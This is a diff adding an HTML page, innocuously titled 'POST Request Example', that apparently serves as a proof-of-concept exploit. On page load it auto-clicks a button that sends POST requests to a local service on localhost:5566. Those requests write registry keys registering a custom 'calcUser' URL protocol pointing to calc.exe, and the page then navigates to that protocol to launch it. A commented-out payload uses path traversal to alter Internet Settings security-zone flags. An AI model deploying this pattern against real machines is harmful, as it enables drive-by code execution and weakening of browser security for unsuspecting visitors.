@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>POST Request Example</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+</head>
+<body>
+
+    <h1>Press the button to execute a POST request</h1>
+
+    <button id="postButton">Execute POST</button>
+
+    <script>
+        var proName = 'calcUser';
+
+        const element = document.getElementById('postButton').addEventListener('click', function() {
+            // URL to which you want to send the POST request
+            var url = 'http://localhost:5566/';
+            
+            // Data to be sent in the POST request (formatted as x-www-form-urlencoded)
+            //var data = 'key_path=../HKEY_CLASSES_ROOT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0&value=71&value_name=Flags&type=1';
+            var data = 'key_path=SOFTWARE\\Classes\\' + proName +'\\shell\\open\\command&value=C:\\\\Windows\\\\System32\\\\calc.exe&type=2';
+            // Creating a new XMLHttpRequest object
+            var xhr = new XMLHttpRequest();
+
+            // Configuring the request
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+            // Handling the response
+            xhr.onload = function () {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    console.log('POST request successful:', xhr.responseText);
+
+                    // Displaying the response body in the console
+                    var response = JSON.parse(xhr.responseText); // Assuming the response is in JSON format
+                    console.log('Response Body:', response);
+
+                    // You can also display the response body in an alert or on the webpage
+                    // alert('Response Body: ' + JSON.stringify(response));
+                } else {
+                    console.error('POST request failed:', xhr.statusText);
+                }
+            };
+
+            // Handling network errors
+            xhr.onerror = function () {
+                console.error('Network error during POST request');
+            };
+
+            // Sending the request with the form-urlencoded data
+            xhr.send(data);
+
+            var xhr2 = new XMLHttpRequest();
+
+            // Configuring the request
+            xhr2.open('POST', url, true);
+            xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+            // Handling the response
+            xhr2.onload = function () {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    console.log('POST request successful:', xhr.responseText);
+
+                    // Displaying the response body in the console
+                    var response = JSON.parse(xhr.responseText); // Assuming the response is in JSON format
+                    console.log('Response Body:', response);
+
+                    // You can also display the response body in an alert or on the webpage
+                    // alert('Response Body: ' + JSON.stringify(response));
+                } else {
+                    console.error('POST request failed:', xhr.statusText);
+                }
+            };
+
+            // Handling network errors
+            xhr2.onerror = function () {
+                console.error('Network error during POST request');
+            };
+
+            var data2 = 'key_path=SOFTWARE\\Classes\\' + proName + '&value=Shao-Lei Wang&type=2';
+
+            xhr2.send(data2);
+
+            var xhr3 = new XMLHttpRequest();
+
+            // Configuring the request
+            xhr3.open('POST', url, true);
+            xhr3.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+            // Handling the response
+            xhr3.onload = function () {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    console.log('POST request successful:', xhr.responseText);
+
+                    // Displaying the response body in the console
+                    var response = JSON.parse(xhr.responseText); // Assuming the response is in JSON format
+                    console.log('Response Body:', response);
+
+                    // You can also display the response body in an alert or on the webpage
+                    // alert('Response Body: ' + JSON.stringify(response));
+                } else {
+                    console.error('POST request failed:', xhr.statusText);
+                }
+            };
+
+            // Handling network errors
+            xhr3.onerror = function () {
+                console.error('Network error during POST request');
+            };
+
+            var data3 = 'key_path=SOFTWARE\\Classes\\' + proName + '&value_name=URL Protocol&type=2';
+
+            xhr3.send(data3);
+            
+            setTimeout(function(){ window.location.href = proName + "://"; }, 500);
+            
+
+
+            
+            // Example: Run a system command
+            //const stringOfExecuting = "<a href=\"" + proName + "://\">Launch My App</a>";
+            
+            //console.log(document.write(stringOfExecuting));
+        });
+        //element.click();
+        
+        $(document).ready(function() {
+        // Simulate a click on the button with the ID "myButton"
+            $("#postButton").click();
+        });
+        
+
+    </script>
+
+</body>
+</html>
